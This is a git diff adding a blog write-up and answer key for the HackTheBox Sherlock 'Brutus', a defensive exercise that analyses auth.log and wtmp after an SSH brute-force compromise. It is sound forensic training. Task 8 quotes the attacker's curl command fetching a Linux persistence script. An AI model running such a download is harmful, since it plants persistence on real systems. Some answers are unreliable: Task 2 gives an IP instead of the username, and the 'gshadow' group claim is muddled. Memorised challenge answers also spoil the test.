@@ -1,8 +1,184 @@
 ---
 title: 'Sherlocks Brutus'
-publishedAt: '2024-04-11'
-summary: 'HackTheBox Sherlocks Challenge Brutus'
+publishedAt: '2024-04-14'
+summary: 'HackTheBox Sherlocks Challenge Brutus Solution easily explained.'
 slug: 'sherlocks-brutus'
 featured: 'true'
 tag: 'htb,technical'
 ---
+
+<img src="/assets/htb/sherlocks-brutus/asset0.png" alt="Sherlocks Brutus"/>
+
+# Sherlock Scenario
+HackTheBox - [Sherlocks Brutus](https://app.hackthebox.com/sherlocks/Brutus)
+
+In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
+
+> Unzip  Brutus.zip
+<CodeBlock title="Terminal">
+```bash
+7z x Brutus.zip
+```
+</CodeBlock>
+
+## Task 1
+***Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?***
+
+**1. Open `auth.log` file using ur editor.**
+
+<CodeBlock title="Terminal">
+```bash
+nvim auth.log
+```
+</CodeBlock>
+
+**2. Upon reviewing the `auth.log` traffic, we can identify ***2 IPs***.**
+
+*203.101.190.9*
+<img src="/assets/htb/sherlocks-brutus/asset1.png" alt="Sherlocks Brutus"/>
+
+*65.2.161.68*
+<img src="/assets/htb/sherlocks-brutus/asset2.png" alt="Sherlocks Brutus"/>
+
+**3. Notice that first IP `203.101.190.9` login single time unlike second IP `65.2.161.68`.**
+**4. Another thing , Notice that `65.2.161.68` able to login after so many *failed attempts*. Indicates that suspect is trying to brute force into.**
+
+<img src="/assets/htb/sherlocks-brutus/asset3.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 1st Task --> ANS: 65.2.161.68
+
+***
+
+## Task 2
+***The brute force attempts were successful, and the attacker gained access to an account on the server.
+What is the username of this account?***
+
+**1. Notice that, suspect did a brute force attack and was successful for user `root`.**
+
+<img src="/assets/htb/sherlocks-brutus/asset4.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 2nd Task --> ANS: 65.2.161.68
+
+***
+
+## Task 3
+***Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?***
+
+**1. Make use of `grep` to filter `auth.log.`**
+<CodeBlock title="Terminal">
+```bash
+cat auth.log | grep "session opened" | grep "root"
+```
+</CodeBlock>
+
+<img src="/assets/htb/sherlocks-brutus/asset5.png" alt="Sherlocks Brutus"/>
+
+**2. Check first Accepted password by `65.2.161.68`.**
+<img src="/assets/htb/sherlocks-brutus/asset6.png" alt="Sherlocks Brutus"/>
+
+>[!NOTE]
+> Note that , as its first instance , it means its the result of brute force attack. Suspect yet did'nt logged in manually.
+
+We need to find second instance.
+<img src="/assets/htb/sherlocks-brutus/asset7.png" alt="Sherlocks Brutus"/>
+
+**3. Cross check result of cat and second instance.**
+
+Times came out to be - `Mar  6 06:32:44`
+However, the 06:32:44 is the times for the attempt for successfull login.
+So the answer should be `06:32:45`
+
+>[!RESULT]
+> 3rd Task --> ANS: 2024-03-06 06:32:45
+
+***
+
+## Task 4
+***SSH login sessions are tracked and assigned a session number upon login.
+What is the session number assigned to the attacker's session for the user account from Question 2?***
+
+**1. Check logs around `Mar 6 06:32:44`.**
+
+We will find session number there i.e. 37.
+<img src="/assets/htb/sherlocks-brutus/asset8.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 4rd Task --> ANS: 37
+
+***
+
+## Task 5
+***The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges.
+What is the name of this account?***
+
+**1. Make use of `grep` to find out new user and its logs.**
+<CodeBlock title="Terminal">
+```bash
+cat auth.log | grep "groupadd"
+```
+</CodeBlock>
+
+As we can see new user `cyberjunkie` was added to group `gshadow`.
+<img src="/assets/htb/sherlocks-brutus/asset9.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 5rd Task --> ANS: cyberjunkie
+
+***
+
+## Task 6
+***What is the MITRE ATT&CK sub-technique ID used for persistence?***
+
+**1. We can find it on official site .**
+
+i.e. - [Mitre official site](https://attack.mitre.org/tactics/TA0003)
+
+>[!RESULT]
+> 6th Task --> ANS: T1136.001
+
+***
+
+## Task 7
+***How long did the attacker's first SSH session last based on the previously confirmed authentication time
+and session ending within the auth.log? (seconds)***
+
+**1. Make use of `last` command.**
+
+<CodeBlock title="Terminal">
+```bash
+last -f wtmp
+```
+</CodeBlock>
+
+We can see time interval `12:02 - 12:07`
+<img src="/assets/htb/sherlocks-brutus/asset10.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 7th Task --> ANS: 279 sec
+
+***
+
+## Task 8
+***The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?***
+
+**1. Make use of `cat` and `grep`**
+
+<CodeBlock title="Terminal">
+```bash
+cat auth.log | grep "COMMAND"
+```
+</CodeBlock>
+
+We can see that suspect has downloaded and ran the script.
+<img src="/assets/htb/sherlocks-brutus/asset11.png" alt="Sherlocks Brutus"/>
+
+>[!RESULT]
+> 8th Task --> ANS: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+
+## References
+
+- [https://app.hackthebox.com/sherlocks/Brutus](https://app.hackthebox.com/sherlocks/Brutus)
+
+- [https://attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003)
